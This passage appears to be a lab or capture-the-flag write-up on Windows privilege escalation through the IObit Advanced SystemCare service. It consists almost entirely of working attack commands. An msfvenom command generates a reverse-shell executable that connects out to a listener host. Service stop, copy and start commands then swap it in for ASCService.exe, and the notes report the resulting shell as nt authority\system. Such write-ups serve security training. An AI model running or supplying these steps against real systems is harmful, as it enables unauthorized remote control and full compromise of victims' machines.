Generated a reverse shell executable file to replace `ASCService.exe` 
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.32.24 LPORT=4422 -f exe > ASCService.exe
```

Transferred the file over to victim machine. 

- Stop the running service
```cmd
net stop "Advanced SystemCare Service 9"
```
- Copy `ASCService.exe` to target location
```cmd
copy ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\"
```
- Start the service
```cmd
net start "Advanced SystemCare Service 9"
```

Gained reverse shell as `nt authority\system`
![[Pasted image 20240813125445.png]]